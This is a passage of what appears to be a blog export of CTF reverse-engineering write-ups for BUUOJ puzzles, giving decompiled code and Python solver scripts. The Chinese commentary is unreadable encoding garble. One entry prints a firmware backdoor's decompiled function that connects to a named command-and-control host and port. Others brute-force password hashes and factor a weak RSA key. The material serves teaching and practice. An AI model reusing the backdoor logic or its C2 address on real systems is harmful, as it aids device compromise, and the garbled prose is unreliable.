0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x4D, 0x4D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x4D, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x45, 0x00, 0x00, 0x00, 0x30, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x45, 0x45, 0x54, 0x54, 0x54, 0x49, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x54, 0x00, 0x49, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x54, 0x00, 0x49, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x21, 0x00, 0x00, 0x00, 0x45, 0x45] ç»“åˆä¸Šé¢çš„ä»£ç å¯ä»¥çŸ¥é“æ˜¯ä¸ªè¿·å®«é¢˜ ç‰¹åˆ«ä¹‹å¤„åœ¨äºä¼šæŒ‰ç…§ç»™å®šæ–¹å‘ä¸€ç›´èµ°, ç›´åˆ°é‡åˆ°é0æ•°æ® flag{MEWEMEWJMEWJM} [FlareOn3]Challenge1 é“¾æ¥: https://buuoj.cn/challenges#[FlareOn3]Challenge1 EXE 32 IDAä¸­ _main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; char Buffer[128]; // [esp+0h] [ebp-94h] BYREF char *Str1; // [esp+80h] [ebp-14h] char *Str2; // [esp+84h] [ebp-10h] HANDLE v7; // [esp+88h] [ebp-Ch] HANDLE hFile; // [esp+8Ch] [ebp-8h] DWORD NumberOfBytesWritten; // [esp+90h] [ebp-4h] BYREF hFile = GetStdHandle(0xFFFFFFF5); v7 = GetStdHandle(0xFFFFFFF6); Str2 = &quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;; WriteFile(hFile, &quot;Enter password:\\r\\n&quot;, 0x12u, &amp;NumberOfBytesWritten, 0); ReadFile(v7, Buffer, 128u, &amp;NumberOfBytesWritten, 0); Str1 = (char *)sub_401260(Buffer, NumberOfBytesWritten - 2); if ( !strcmp(Str1, Str2) ) WriteFile(hFile, &quot;Correct!\\r\\n&quot;, 0xBu, &amp;NumberOfBytesWritten, 0); else WriteFile(hFile, &quot;Wrong password\\r\\n&quot;, 0x11u, &amp;NumberOfBytesWritten, 0); return 0;&#125; è·Ÿè¿›å‡½æ•°sub_401260å¯ä»¥çœ‹åˆ°ä¸€ä¸ªBase64è¡¨ Base64æ›¿æ¢ 12345678910#!/usr/bin/env python3import base64 table1 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;table2 = &quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;cipher = &quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;_flag = &quot;&quot;for _ in cipher: _flag += table1[table2.index(_)]flag = base64.b64decode(_flag)print(flag) flag{sh00ting_phish_in_a_barrel@flare-on.com} firmware é“¾æ¥: https://buuoj.cn/challenges#firmware Firmware 1234567891011binwalk 51475f91-7b90-41dd-81a3-8b82df4f29d0.bin DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 TP-Link firmware header, firmware version: 1.-20432.3, image version: &quot;&quot;, product ID: 0x0, product version: 155254791, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 772784, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 069424 0x10F30 Certificate in DER format (x509 v3), header length: 4, sequence length: 6494080 0x16F80 U-Boot version string, &quot;U-Boot 1.1.4 (Aug 26 2013 - 09:07:51)&quot;94256 0x17030 CRC32 polynomial table, big endian131584 0x20200 TP-Link firmware header, firmware version: 0.0.3, image version: &quot;&quot;, product ID: 0x0, product version: 155254791, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 772784, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 00132096 0x20400 LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2203728 bytes1180160 0x120200 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2774624 bytes, 519 inodes, blocksize: 131072 bytes, created: 2015-04-13 09:35:04 é¢˜ç›®ä¸­æ‰€æåˆ°çš„Backdooråº”è¯¥å°±åœ¨Squashfs filesystemä¸­ binwalkåˆ†ç¦»æ–‡ä»¶, ä½†æ˜¯unsquashfså‘½ä»¤ä¸èƒ½è§£å‹ç¼©è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿ éœ€è¦ä½¿ç”¨firmware-mod-kit https://github.com/rampageX/firmware-mod-kit/ ç”¨g++10ç¼–è¯‘æºç çš„æ—¶å€™æœ‰ç‚¹é—®é¢˜, éœ€è¦ä¿®æ”¹ä¸‹æºç  mksquashfs.cä¸­æŸäº›å‡½æ•°æˆ–å˜é‡æ²¡æœ‰åŠ staticé€ æˆçš„é‡å¤å®šä¹‰é—®é¢˜ æŸéƒ¨åˆ†ä»£ç å°‘åŒ…å«äº†&lt;sys/sysmacros.h&gt; 1./unsquashfs_all.sh 120200.squashfs åœ¨tmpä¸­æ‰¾åˆ°backdoor IDAä¸­ initConnection å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627bool initConnection()&#123; char *v0; // r0 char s[512]; // [sp+4h] [bp-208h] BYREF int v3; // [sp+204h] [bp-8h] memset(s, 0, sizeof(s)); if ( mainCommSock ) &#123; close(mainCommSock); mainCommSock = 0; &#125; if ( currentServer ) ++currentServer; else currentServer = 0; strcpy(s, (&amp;commServer)[currentServer]); v3 = 36667; if ( strchr(s, &#x27;:&#x27;) ) &#123; v0 = strchr(s, &#x27;:&#x27;); v3 = atoi(v0 + 1); *strchr(s, 58) = 0; &#125; mainCommSock = socket(2, 1, 0); return connectTimeout(mainCommSock, (int)s, v3, 30) == 0;&#125; å¯ä»¥å¾—åˆ°C2 12echo -n &quot;echo.byethost51.com:36667&quot; | md5sum33a422c45d551ac6e4756f59812a954b flag{33a422c45d551ac6e4756f59812a954b} [Zer0pts2020]easy strcmp é“¾æ¥: https://buuoj.cn/challenges#[Zer0pts2020]easy strcmp ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415__int64 __fastcall main(int a1, char **a2, char **a3)&#123; if ( a1 &gt; 1 ) &#123; if ( !strcmp(a2[1], byte_8E0) ) puts(&quot;Correct!&quot;); else puts(&quot;Wrong!&quot;); &#125; else &#123; printf(&quot;Usage: %s &lt;FLAG&gt;\\n&quot;, *a2); &#125; return 0LL;&#125; çœ‹åˆ°ä¸€ä¸ªå¯ç–‘çš„å‡½æ•° 12345678910111213__int64 __fastcall sub_6EA(__int64 a1, __int64 a2)&#123; int i; // [rsp+18h] [rbp-8h] int v4; // [rsp+18h] [rbp-8h] int j; // [rsp+1Ch] [rbp-4h] for ( i = 0; *(_BYTE *)(i + a1); ++i ) ; v4 = (i &gt;&gt; 3) + 1; for ( j = 0; j &lt; v4; ++j ) *(_QWORD *)(8 * j + a1) -= qword_201060[j]; return qword_201090(a1, a2);&#125; è™½ç„¶mainå‡½æ•°ä¸­æ²¡æœ‰è°ƒç”¨è¿™ä¸ªå‡½æ•°, åœ¨IDAä¸­åœ¨è¿™ä¸ªå‡½æ•°ä¸‹æ–­ç‚¹, å¯ä»¥çœ‹åˆ°è¾“å…¥çš„å†…å®¹è¢«è¿›è¡Œè¿ç®—, å¤§æ¦‚æ˜¯hook 1qword_201060 = [0x0, 0x410A4335494A0942, 0x0B0EF2F50BE619F0, 0x4F0A3A064A35282B,0x0] IDAä¸­qword_201060æ‰€å±•ç¤ºå‡ºçš„æ•°æ®ä¸ºå¤§ç«¯ è€Œå­—ç¬¦ä¸²&quot;zer0pts&#123;********CENSORED********&#125;&quot;ä¸ºå°ç«¯ æ‰€ä»¥éœ€è¦åœ¨è®¡ç®—ä¹‹å‰è¦å…ˆè½¬ä¸ºå¤§ç«¯ 1234567891011#!/usr/bin/env python3from Crypto.Util.number import *_201060 = [0x410A4335494A0942, 0x0B0EF2F50BE619F0, 0x4F0A3A064A35282B]cipher = &quot;********CENSORED********&quot;flag = &quot;flag&#123;&quot;for i in range(3): c = cipher[8*i:8*i+8].encode()[::-1] plain = bytes_to_long(c) flag += long_to_bytes(plain + _201060[i]).decode()[::-1]flag += &quot;&#125;&quot;print(flag) flag{l3ts_m4k3_4_DETOUR_t0d4y} [ACTFæ–°ç”Ÿèµ›2020]Universe_final_answer é“¾æ¥: https://buuoj.cn/challenges#[ACTFæ–°ç”Ÿèµ›2020]Universe_final_answer ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 1234567891011121314151617181920__int64 __fastcall main(int a1, char **a2, char **a3)&#123; char v4[32]; // [rsp+0h] [rbp-A8h] BYREF char v5[104]; // [rsp+20h] [rbp-88h] BYREF unsigned __int64 v6; // [rsp+88h] [rbp-20h] v6 = __readfsqword(0x28u); __printf_chk(1LL, (__int64)&quot;Please give me the key string:&quot;, (__int64)a3); scanf(&quot;%s&quot;, v5); if ( sub_860(v5) ) &#123; sub_C50(v5, v4); __printf_chk(1LL, (__int64)&quot;Judgement pass! flag is actf&#123;%s_%s&#125;\\n&quot;, (__int64)v5); &#125; else &#123; puts(&quot;False key!&quot;); &#125; return 0LL;&#125; è·Ÿè¿›sub_860 1234567891011121314151617181920212223242526272829303132333435363738394041bool __fastcall sub_860(char *a1)&#123; int b1; // ecx int b0; // esi int b2; // edx int b3; // er9 int b4; // er11 int b6; // ebp int b5; // ebx int b7; // er8 int b8; // er10 bool result; // al int b9; // [rsp+0h] [rbp-38h] b1 = a1[1]; b0 = *a1; b2 = a1[2]; b3 = a1[3]; b4 = a1[4]; b6 = a1[6]; b5 = a1[5]; b7 = a1[7]; b8 = a1[8]; result = 0; if ( -85 * b8 + 58 * b7 + 97 * b6 + b5 + -45 * b4 + 84 * b3 + 95 * b0 - 20 * b1 + 12 * b2 == 12613 ) &#123; b9 = a1[9]; if ( 30 * b9 + -70 * b8 + -122 * b6 + -81 * b5 + -66 * b4 + -115 * b3 + -41 * b2 + -86 * b1 - 15 * b0 - 30 * b7 == -54400 &amp;&amp; -103 * b9 + 120 * b7 + 108 * b5 + 48 * b3 + -89 * b2 + 78 * b1 - 41 * b0 + 31 * b4 - (b6 &lt;&lt; 6) - 120 * b8 == -10283 &amp;&amp; 71 * b6 + (b5 &lt;&lt; 7) + 99 * b4 + -111 * b2 + 85 * b1 + 79 * b0 - 30 * b3 - 119 * b7 + 48 * b8 - 16 * b9 == 22855 &amp;&amp; 5 * b9 + 23 * b8 + 122 * b7 + -19 * b6 + 99 * b5 + -117 * b4 + -69 * b2 + 22 * b1 - 98 * b0 + 10 * b3 == -2944 &amp;&amp; -54 * b9 + -23 * b7 + -82 * b2 + -85 * b0 + 124 * b1 - 11 * b3 - 8 * b4 - 60 * b5 + 95 * b6 + 100 * b8 == -2222 &amp;&amp; -83 * b9 + -111 * b5 + -57 * b0 + 41 * b1 + 73 * b2 - 18 * b3 + 26 * b4 + 16 * b6 + 77 * b7 - 63 * b8 == -13258 &amp;&amp; 81 * b9 + -48 * b8 + 66 * b7 + -104 * b6 + -121 * b5 + 95 * b4 + 85 * b3 + 60 * b2 + -85 * b0 + 80 * b1 == -1559 &amp;&amp; 101 * b9 + -85 * b8 + 7 * b6 + 117 * b5 + -83 * b4 + -101 * b3 + 90 * b2 + -28 * b1 + 18 * b0 - b7 == 6308 ) &#123; result = 99 * b9 + -28 * b8 + 5 * b7 + 93 * b6 + -18 * b5 + -127 * b4 + 6 * b3 + -9 * b2 + -93 * b1 + 58 * b0 == -1697; &#125; &#125; return result;&#125; sageè§£çº¿æ€§æ–¹ç¨‹å³å¯ 1234567891011121314151617#!/usr/bin/env python3b = Matrix([[12613], [-54400], [-10283], [22855], [-2944], [-2222], [-13258], [-1559], [6308], [-1697]])x = Matrix([[95, -20, 12, 84, -45, 1, 97, 58, -85, 0], [-15, -86, -41, -115, -66, -81, -122, -30, -70, 30], [-41, 78, -89, 48, 31, 108, -64, 120, -120, -103], [79, 85, -111, -30, 99, 128, 71, -119, 48, -16], [-98, 22, -69, 10, -117, 99, -19, 122, 23, 5], [-85, 124, -82, -11, -8, -60, 95, -23, 100, -54], [-57, 41, 73, -18, 26, -111, 16, 77, -63, -83], [-85, 80, 60, 85, 95, -121, -104, 66, -48, 81], [18, -28, 90, -101, -83, 117, 7, -1, -85, 101], [58, -93, -9, 6, -127, -18, 93, 5, -28, 99,]]).solve_right(b)key = &quot;&quot;for _ in x: key += chr(_[0])print(key) å¾—åˆ°key=&quot;F0uRTy_7w@&quot;, åœ¨ç¨‹åºä¸­è¾“å…¥keyå³å¯å¾—åˆ°flag flag{F0uRTy_7w@_42} [UTCTF2020]basic-re é“¾æ¥: https://buuoj.cn/challenges#[UTCTF2020]basic-re ELF 64 æ•°æ®éƒ¨åˆ†å³å¯çœ‹åˆ°flag flag{str1ngs_1s_y0ur_fr13nd} EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"}]},{"title":"Reverse_1","slug":"Reverse-1","date":"2021-05-18T01:46:26.000Z","updated":"2021-05-22T11:14:32.000Z","comments":true,"path":"2021/05/17/Reverse-1/","link":"","permalink":"https://yoloyolo.top/2021/05/17/Reverse-1/","excerpt":"è™½ç„¶é—²ç€ä½†æ˜¯ä¸æƒ³è®©è‡ªå·±é—²ç€, å…ˆåˆ·å®ŒBUUOJçš„ç¬¬ä¸€é¡µé€†å‘å§","text":"è™½ç„¶é—²ç€ä½†æ˜¯ä¸æƒ³è®©è‡ªå·±é—²ç€, å…ˆåˆ·å®ŒBUUOJçš„ç¬¬ä¸€é¡µé€†å‘å§ [BJDCTF2020]JustRE é“¾æ¥: https://buuoj.cn/challenges#[BJDCTF2020]JustRE EXE 32 IDAä¸­ DialogFunc å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324BOOL __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)&#123; CHAR String; // [esp+0h] [ebp-64h] if ( a2 != 272 ) &#123; if ( a2 != 273 ) return 0; if ( (_WORD)a3 != 1 &amp;&amp; (_WORD)a3 != 2 ) &#123; sprintf(&amp;String, aD, ++dword_4099F0); if ( dword_4099F0 == 19999 ) &#123; sprintf(&amp;String, aBjdDD2069a4579, 19999, 0); SetWindowTextA(hWnd, &amp;String); return 0; &#125; SetWindowTextA(hWnd, &amp;String); return 0; &#125; EndDialog(hWnd, (unsigned __int16)a3); &#125; return 1;&#125; aD = &quot;æ‚¨å·²ç»ç‚¹äº† %d æ¬¡&quot; dword_4099F0 = 0 aBjdDD2069a4579 = &quot;BJD&#123;%d%d2069a45792d233ac&#125;&quot; å½“è®¡æ•°åˆ°è¾¾19999ä¹‹åå¾—åˆ°flag, ç”¨19999å’Œ0åˆ†åˆ«æ›¿æ¢ä¸¤ä¸ª%då³ä¸ºflag flag{1999902069a45792d233ac} rsa é“¾æ¥: https://buuoj.cn/challenges#rsa è¿™é¢˜æ”¾é”™åˆ†ç±»äº†å§â€¦ ä½¿ç”¨opensslä»å…¬é’¥æ–‡ä»¶ä¸­æå–e, n 123456789openssl rsa -pubin -modulus -text -in pub.key RSA Public-Key: (256 bit)Modulus: 00:c0:33:2c:5c:64:ae:47:18:2f:6c:1c:87:6d:42: 33:69:10:54:5a:58:f7:ee:fe:fc:0b:ca:af:5a:f3: 41:cc:ddExponent: 65537 (0x10001)Modulus=C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDDwriting RSA key e = 0x10001 n = 0xC0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD http://www.factordb.com/index.php åœ¨è¿™ä¸ªç½‘ç«™åˆ†è§£nå¾—åˆ°ä¸¤ä¸ªç´ æ•° p = 285960468890451637935629440372639283459 q = 304008741604601924494328155975272418463 12345678910111213#!/usr/bin/env python3from Crypto.Util.number import *p = 285960468890451637935629440372639283459q = 304008741604601924494328155975272418463e = 65537n = p * qphi = (p - 1)*(q - 1)d = inverse(e, phi)import rsakey = rsa.PrivateKey(n,e,d,p,q)c = open(&#x27;flag.enc&#x27;,&#x27;rb&#x27;).read()print(rsa.decrypt(c,key)) flag{decrypt_256} CrackRTF é“¾æ¥: https://buuoj.cn/challenges#CrackRTF EXE 32 IDAä¸­ _main_0 å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152int __cdecl main_0()&#123; DWORD v0; // eax DWORD v1; // eax CHAR String; // [esp+4Ch] [ebp-310h] int v4; // [esp+150h] [ebp-20Ch] CHAR String1; // [esp+154h] [ebp-208h] BYTE pbData; // [esp+258h] [ebp-104h] memset(&amp;pbData, 0, 0x104u); memset(&amp;String1, 0, 0x104u); v4 = 0; printf(&quot;pls input the first passwd(1): &quot;); scanf(&quot;%s&quot;, &amp;pbData); if ( strlen((const char *)&amp;pbData) != 6 ) &#123; printf(&quot;Must be 6 characters!\\n&quot;); ExitProcess(0); &#125; v4 = atoi((const char *)&amp;pbData); if ( v4 &lt; 100000 ) ExitProcess(0); strcat((char *)&amp;pbData, &quot;@DBApp&quot;); v0 = strlen((const char *)&amp;pbData); sub_40100A(&amp;pbData, v0, &amp;String1); if ( !_strcmpi(&amp;String1, &quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;) ) &#123; printf(&quot;continue...\\n\\n&quot;); printf(&quot;pls input the first passwd(2): &quot;); memset(&amp;String, 0, 0x104u); scanf(&quot;%s&quot;, &amp;String); if ( strlen(&amp;String) != 6 ) &#123; printf(&quot;Must be 6 characters!\\n&quot;); ExitProcess(0); &#125; strcat(&amp;String, (const char *)&amp;pbData); memset(&amp;String1, 0, 0x104u); v1 = strlen(&amp;String); sub_401019((BYTE *)&amp;String, v1, &amp;String1); if ( !_strcmpi(&quot;27019e688a4e62a649fd99cadaafdb4e&quot;, &amp;String1) ) &#123; if ( !(unsigned __int8)sub_40100F(&amp;String) ) &#123; printf(&quot;Error!!\\n&quot;); ExitProcess(0); &#125; printf(&quot;bye ~~\\n&quot;); &#125; &#125; return 0;&#125; è¾“å…¥çš„ç¬¬ä¸€ä¸ªå¯†ç è¦æ±‚ä¸ºå…­ä½å­—ç¬¦ å‡½æ•°atoiåˆ™æ˜¯å°†å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­— åˆ™ç¬¬ä¸€ä¸ªå¯†ç éœ€è¦è¾“å…¥å…­ä½æ•°å­— è·Ÿè¿›åˆ°å‡½æ•°sub_401230 ä½¿ç”¨å‡½æ•°CryptCreateHash ç¬¬äºŒä¸ªå‚æ•°ä¸ºæ‰€ä½¿ç”¨çš„åŠ å¯†ç®—æ³• https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id é€šè¿‡è¿™ä¸ªæ–‡æ¡£å¯ä»¥å¾—çŸ¥0x8003ä¸ºmd5, 0x8004ä¸ºsha1 æ‰€ä»¥å¯ä»¥çˆ†ç ´ç¬¬ä¸€æ®µhash 12345678#!/usr/bin/env python3import hashlibpasswd = b&quot;&quot;for _ in range(100000, 1000000): test = str(_).encode()+b&quot;@DBApp&quot; if hashlib.sha1(test).hexdigest() == &quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;: print(passwd) break 123321@DBApp è€Œå¯¹äºç¬¬äºŒæ®µçš„md5åŠ å¯†ç»“æœ, æ²¡æœ‰ä½œè¾“å…¥å­—ç¬¦é›†çš„é™å®š, æ¯”è¾ƒéš¾ä»¥çˆ†ç ´ https://www.somd5.com/ é€šè¿‡è¿™ä¸ªé“¾æ¥å¯ä»¥å¾—åˆ°md5çš„æ˜æ–‡ ~!3a@0123321@DBApp å…¶å®å®Œå…¨æ²¡å¿…è¦çˆ†ç ´sha1, ç›´æ¥åœ¨somd5æŸ¥æ˜æ–‡å°±èƒ½è§£é¢˜äº† è€Œåç»­çš„RTFæ“ä½œæœ‰äº›å¤æ‚, è¿™é‡Œå¯ä»¥é€šè¿‡è¿è¡Œç¨‹åºè¾“å…¥å¯†ç æ¥å¾—åˆ°flag flag{N0_M0re_Free_Bugs} [ACTFæ–°ç”Ÿèµ›2020]easyre é“¾æ¥: https://buuoj.cn/challenges#[ACTFæ–°ç”Ÿèµ›2020]easyre EXE 32 å­˜åœ¨UPXå£³, è„±å£³åIDAä¸­ _main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+12h] [ebp-2Eh] char c1[12]; char v5; // [esp+13h] [ebp-2Dh] char v6; // [esp+14h] [ebp-2Ch] char v7; // [esp+15h] [ebp-2Bh] char v8; // [esp+16h] [ebp-2Ah] char v9; // [esp+17h] [ebp-29h] char v10; // [esp+18h] [ebp-28h] char v11; // [esp+19h] [ebp-27h] char v12; // [esp+1Ah] [ebp-26h] char v13; // [esp+1Bh] [ebp-25h] char v14; // [esp+1Ch] [ebp-24h] char v15; // [esp+1Dh] [ebp-23h] c1 end int v16; // [esp+1Eh] [ebp-22h] int i1[3]; int v17; // [esp+22h] [ebp-1Eh] int v18; // [esp+26h] [ebp-1Ah] i1 end __int16 v19; // [esp+2Ah] [ebp-16h] char c2[18]; char v20; // [esp+2Ch] [ebp-14h] char v21; // [esp+2Dh] [ebp-13h] char v22; // [esp+2Eh] [ebp-12h] int v23; // [esp+2Fh] [ebp-11h] int i2[3]; int v24; // [esp+33h] [ebp-Dh] int v25; // [esp+37h] [ebp-9h] i2 end char v26; // [esp+3Bh] [ebp-5h] c2 end int i; // [esp+3Ch] [ebp-4h] __main(); v4 = &#x27;*&#x27;; v5 = &#x27;F&#x27;; v6 = &#x27;\\&#x27;&#x27;; v7 = &#x27;&quot;&#x27;; v8 = &#x27;N&#x27;; v9 = &#x27;,&#x27;; v10 = &#x27;&quot;&#x27;; v11 = &#x27;(&#x27;; v12 = &#x27;I&#x27;; v13 = &#x27;?&#x27;; v14 = &#x27;+&#x27;; v15 = &#x27;@&#x27;; printf(&quot;Please input:&quot;); scanf(&quot;%s&quot;, &amp;v19); if ( (_BYTE)v19 != &#x27;A&#x27; || HIBYTE(v19) != &#x27;C&#x27; || v20 != &#x27;T&#x27; || v21 != &#x27;F&#x27; || v22 != &#x27;&#123;&#x27; || v26 != &#x27;&#125;&#x27; ) return 0; v16 = v23; v17 = v24; v18 = v25; for ( i = 0; i &lt;= 11; ++i ) &#123; if ( *(&amp;v4 + i) != _data_start__[*((char *)&amp;v16 + i) - 1] ) return 0; &#125; printf(&quot;You are correct!&quot;); return 0;&#125; è¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯, char c2[18]ä¸­æ’å…¥äº†ä¸€ä¸ªint i2[3], è€Œintä½¿ç”¨4Byte, charä½¿ç”¨1Byte, å¼„æ¸…æ¥šå†…å­˜å¤§å°å¯¹åº”å…³ç³»å³å¯ v16,v17,v18å¯¹åº”v23,v24,v25, å³flag[5:18] *((char *)&amp;v16 + i) æ„ä¸ºç”¨charæŒ‡é’ˆå»è®¿é—®v16çš„å†…å­˜, æ¯æ¬¡è¯»å–ä¸€ä¸ªå­—èŠ‚, å®é™…ä¸Šæ˜¯è¯»å–flag[5:18] 1_data_start__ == &quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;&amp;%$# !\\&quot;&quot; 12345678#!/usr/bin/env python3data = &quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;&amp;%$# !\\&quot;&quot;string1 = &quot;*F&#x27;\\&quot;N,\\&quot;(I?+@&quot;flag = &quot;flag&#123;&quot;for _ in string1: flag += chr(data.index(_)+1)flag += &quot;&#125;&quot;print(flag) flag{U9X_1S_W6@T?} [2019çº¢å¸½æ¯]easyRE é“¾æ¥: https://buuoj.cn/challenges#[2019çº¢å¸½æ¯]easyRE ELF 64 IDAä¸­å‡½æ•° sub_4009C6 çš„åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148signed __int64 sub_4009C6()&#123; signed __int64 result; // rax __int64 v1; // ST10_8 __int64 v2; // ST18_8 __int64 v3; // ST20_8 __int64 v4; // ST28_8 __int64 v5; // ST30_8 __int64 v6; // ST38_8 __int64 v7; // ST40_8 __int64 v8; // ST48_8 __int64 v9; // ST50_8 __int64 v10; // ST58_8 int i; // [rsp+Ch] [rbp-114h] char v12; // [rsp+60h] [rbp-C0h] char c1[36]; char v13; // [rsp+61h] [rbp-BFh] char v14; // [rsp+62h] [rbp-BEh] char v15; // [rsp+63h] [rbp-BDh] char v16; // [rsp+64h] [rbp-BCh] char v17; // [rsp+65h] [rbp-BBh] char v18; // [rsp+66h] [rbp-BAh] char v19; // [rsp+67h] [rbp-B9h] char v20; // [rsp+68h] [rbp-B8h] char v21; // [rsp+69h] [rbp-B7h] char v22; // [rsp+6Ah] [rbp-B6h] char v23; // [rsp+6Bh] [rbp-B5h] char v24; // [rsp+6Ch] [rbp-B4h] char v25; // [rsp+6Dh] [rbp-B3h] char v26; // [rsp+6Eh] [rbp-B2h] char v27; // [rsp+6Fh] [rbp-B1h] char v28; // [rsp+70h] [rbp-B0h] char v29; // [rsp+71h] [rbp-AFh] char v30; // [rsp+72h] [rbp-AEh] char v31; // [rsp+73h] [rbp-ADh] char v32; // [rsp+74h] [rbp-ACh] char v33; // [rsp+75h] [rbp-ABh] char v34; // [rsp+76h] [rbp-AAh] char v35; // [rsp+77h] [rbp-A9h] char v36; // [rsp+78h] [rbp-A8h] char v37; // [rsp+79h] [rbp-A7h] char v38; // [rsp+7Ah] [rbp-A6h] char v39; // [rsp+7Bh] [rbp-A5h] char v40; // [rsp+7Ch] [rbp-A4h] char v41; // [rsp+7Dh] [rbp-A3h] char v42; // [rsp+7Eh] [rbp-A2h] char v43; // [rsp+7Fh] [rbp-A1h] char v44; // [rsp+80h] [rbp-A0h] char v45; // [rsp+81h] [rbp-9Fh] char v46; // [rsp+82h] [rbp-9Eh] char v47; // [rsp+83h] [rbp-9Dh] c1 end char v48[32]; // [rsp+90h] [rbp-90h] int v49; // [rsp+B0h] [rbp-70h] char v50; // [rsp+B4h] [rbp-6Ch] char v51; // [rsp+C0h] [rbp-60h] char v52; // [rsp+E7h] [rbp-39h] char v53; // [rsp+100h] [rbp-20h] unsigned __int64 v54; // [rsp+108h] [rbp-18h] v54 = __readfsqword(0x28u); v12 = 73; v13 = 111; v14 = 100; v15 = 108; v16 = 62; v17 = 81; v18 = 110; v19 = 98; v20 = 40; v21 = 111; v22 = 99; v23 = 121; v24 = 127; v25 = 121; v26 = 46; v27 = 105; v28 = 127; v29 = 100; v30 = 96; v31 = 51; v32 = 119; v33 = 125; v34 = 119; v35 = 101; v36 = 107; v37 = 57; v38 = 123; v39 = 105; v40 = 121; v41 = 61; v42 = 126; v43 = 121; v44 = 76; v45 = 64; v46 = 69; v47 = 67; memset(v48, 0, sizeof(v48)); v49 = 0; v50 = 0; sub_4406E0(0LL, (__int64)v48); v50 = 0; if ( sub_424BA0(v48) == 36 ) &#123; for ( i = 0; i &lt; (unsigned __int64)sub_424BA0(v48); ++i ) &#123; if ( (unsigned __int8)(v48[i] ^ i) != *(&amp;v12 + i) ) &#123; result = 4294967294LL; goto LABEL_13; &#125; &#125; sub_410CC0((__int64)&quot;continue!&quot;); memset(&amp;v51, 0, 0x40uLL); v53 = 0; sub_4406E0(0LL, (__int64)&amp;v51); v52 = 0; if ( sub_424BA0(&amp;v51) == 39 ) &#123; v1 = sub_400E44((__int64)&amp;v51); v2 = sub_400E44(v1); v3 = sub_400E44(v2); v4 = sub_400E44(v3); v5 = sub_400E44(v4); v6 = sub_400E44(v5); v7 = sub_400E44(v6); v8 = sub_400E44(v7); v9 = sub_400E44(v8); v10 = sub_400E44(v9); if ( !(unsigned int)sub_400360(v10, (__int64)off_6CC090) ) &#123; sub_410CC0((__int64)&quot;You found me!!!&quot;); sub_410CC0((__int64)&quot;bye bye~&quot;); &#125; result = 0LL; &#125; else &#123; result = 0xFFFFFFFDLL; &#125; &#125; else &#123; result = 